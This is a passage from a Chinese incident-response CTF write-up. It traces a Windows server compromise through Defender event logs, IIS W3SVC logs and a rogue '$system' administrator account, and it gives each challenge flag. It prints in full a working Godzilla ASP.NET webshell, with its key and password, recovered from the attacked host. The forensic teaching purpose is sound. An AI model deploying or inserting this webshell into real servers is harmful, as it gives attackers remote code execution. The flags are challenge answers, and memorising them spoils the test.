![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaJwNFURSibqLRfHkjtKBiaUhs9TUia0ZvNRsZ0gOUSFj72D8MFIJQIOz5w/640?wx_fmt=png&from=appmsg "")  
  
由上图分析，得到Windows defender首次检测到执行的命令为：whoami  
  
本题flag为：flag{whoami}  
#### 3. Windows defender专项  
>   
> 提交Windows defender病毒和威胁防护中，杀软隔离的第一个webshell文件，提交文件名，提交示例：flag{shell.php}  
  
  
仍然是筛选事件ID：1116  
，往下找和文件有关的事件  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaqDvIpkkyNNT7BK3OOf9v1c5dxGmgecpFxg1OaAOaN2zvOWolUrbtEg/640?wx_fmt=png&from=appmsg "")  
  
如上图所示在11:24:15秒检测到文件名为：6390217215502412559088650.aspx  
  
这在排查恶意攻击的恶意文件时至关重要，用于研判黑客手法  
  
所以本题flag为：flag{6390217215502412559088650.aspx}  
#### 4. 日志专项  
>   
> 审计web日志，攻击者在多次上传webshell后，最终远控使用的webshell文件是哪个，提交文件名，提交示例：flag{shell.php}  
  
  
这里是去审计W3SVC  
中的1224日志，因为这是连接webshell的主要日志  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iayUmyab8aVoBWXgKyulgf3xCKddAwAdAU2cpONjLWMjo2YTXnhw58dw/640?wx_fmt=png&from=appmsg "")  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iajWQfic5m6Qz3tdgKyBXbL2wYCGvW3eT4oOIg8f1nOo4gQlnfcFFZYYA/640?wx_fmt=png&from=appmsg "")  
  
通过审计日志看到，过程中包含了：  
```
6390217261498889944132731.aspx  6390217215502412559088650.aspx  6390217228358522529477835.aspx  6390217295972468102047086.aspx  6390217325293187938071651.aspx  6390217358631910697152957.aspx
```  
  
出现次数最多最频繁，直至最后的文件是6390217325293187938071651.aspx  
，再去查看一下这个文件的内容  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaZzTdYrU1yQ1iaQfpo8QvqUaPEKibjXtO4lL4icFXkIn3NWzQHnbfTVibKA/640?wx_fmt=png&from=appmsg "")  
```
<%@ Page Language="C#"%><%try { string key = "3c6e0b8a9c15224a"; string pass = "solar"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Application["payload"] == null) { Context.Application["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Application["payload"]).CreateInstance("LY"); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }  %>
```  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaukBPs8aVeUmLVLyUxezIHCibvHYfsQs6jyrnRbdXMNKRYbLTfibpHMkQ/640?wx_fmt=png&from=appmsg "")  
  
所以这个程序就是典型的webshell，且存在key和pass，这是**哥斯拉webshell**  
  
所以本题flag为：flag{6390217325293187938071651.aspx}  
#### 5. 木马专项  
>   
> 提交攻击者最终使用的webshell中key和pass，提交示例：flag{key&pass}  
  
  
前面我们提到了这是哥斯拉的webshell，存在key和pass  
```
string key = "3c6e0b8a9c15224a";  string pass = "solar";
```  
  
key取自MD5的前16位(不了解的可以自行使用哥斯拉生成webshell学习原理)，这里推荐去SOMD5查询因为免费  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iajGA9hfpNEC47IbWxkwzjAbzYWFeR6D2ic6qT9Gk6ZHJawES5CHjbM4g/640?wx_fmt=png&from=appmsg "")  
  
所以本题的flag为：flag{key&solar}  
#### 6. 远控专项  
>   
> 审计系统日志，提交攻击者远控后关闭Windows defender的时间，可使用桌面\工具\FullEventLogView辅助审计，提交示例：flag{2025/1/1 12:01:01}  
  
  
根据前面排查梳理一下思路：**攻击者前期进行WEB扫描->找到Ueditor编辑器->尝试利用漏洞->利用成功->上传webshell->执行命令->Windows defender查杀并隔离文件->攻击者上传哥斯拉webshell**  
  
那接下来攻击者为了进一步内网攻击，则会关闭杀软，这也是实战中大部分攻击队及勒索家族习惯做的  
  
继续整理一下操作类事件ID如下  
  
<table><thead><tr><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">事件 ID</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">日志类型 (Log Name)</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">含义 (Meaning)</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">关键取证细节 (Key Forensics)</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">5001</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Windows Defender/Operational</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">实时保护已禁用 (Real-time Protection Disabled)</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">这是最核心的“结果”日志。 当看到此 ID，说明防护已关闭。 日志内容通常为：“Microsoft Defender Antivirus Real-time Protection has been disabled.”</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">5007</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Windows Defender/Operational</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">配置已更改 (Configuration Changed)</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">这是“手段”日志。 记录了具体的注册表或策略修改动作。 重点找： Path: HKLM...\DisableRealtimeMonitoring Old Value: 0 (开) -&gt; New Value: 1 (关)</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">5000</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Windows Defender/Operational</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">实时保护已启用 (Real-time Protection Enabled)</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">这是“恢复”日志。 如果攻击者操作完后试图掩盖痕迹重新开启，会出现此日志。</span></section></td></tr></tbody></table>  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaMS2Fq3Mia1cyN9xMm0HicpGrswxFbPcf9sjIQwpAu5TwhhGYXl9zIiaow/640?wx_fmt=png&from=appmsg "")  
  
在经过筛选事件ID：5001后，很明显攻击者在2025/12/24 12:24:07  
关闭了Windows defender  
  
所以本题flag为：flag{2025/12/24 12:24:07}  
#### 7. 远控专项  
>   
> 审计系统日志，提交攻击者创建的用户名及远程登录IP及时间，提交示例：flag{user&1.1.1.1&2025/1/1 12:01:01}  
  
  
一般情况下，攻击者webshell控制机器后会想办法更方便获取终端权限，常见思路如下  
- 远程登录：对外开放了3389端口或可以手动开启3389且能对外访问  
  
- C2：无法终端远控的情况下，上C2进行远控  
  
终端远控比webshell远控更方便一些且可以执行更多的功能  
  
这里显然攻击者使用了3389端口远程登录，在没有administrator  
密码的情况下，创建了一个账号(**攻击者之前关闭了Windows defender表示他有权限创建账号，甚至高权限账号**  
)  
  
先执行net user  
查看一下全部账号  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaKUZrjx8oQobISuZpmibOk2icCiaGjfuDicIiagX8jwv0icWEia8Zu5ynNEVzw/640?wx_fmt=png&from=appmsg "")  
  
  
可疑的是这个  
$system  
，它不是系统账号，又有特殊符号，而且还不是隐藏账户，因为隐藏账户的$在右侧，比如system$  
  
执行net user $system  
查看创建时间  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iajBS7PoXAtGWgmYu3j6oicqXwmQO9VeCMQRdxqzyGm8rOEotZ8TCGoLg/640?wx_fmt=png&from=appmsg "")  
  
根据执行结果可看到创建设置密码的时间在关闭杀毒软件后，且此账号在管理员组内，非常可疑  
  
这里还有个知识点，倘若攻击者创建了隐藏账号，使用net user  
是查不到的，那应该怎么查询？  
  
**WIN+R->lusrmgr.msc->用户和组**  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iac3Fkp1JIvz73nnkVuAkT71EFecEadYQQGLfMDyKokwha2ZbeLbiaIMQ/640?wx_fmt=png&from=appmsg "")  
  
<table><thead><tr><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">命令</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">描述</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">备注</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">compmgmt.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">计算机管理</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">集成了设备管理、磁盘管理、服务等</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">services.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">服务管理</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">启动、停止、禁用系统服务</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">lusrmgr.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">本地用户和组</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">管理用户账号、重置密码、修改组权限</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">gpedit.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">本地组策略编辑器</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">(家庭版默认无) 修改系统策略</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">secpol.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">本地安全策略</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">修改密码策略、审核策略等</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 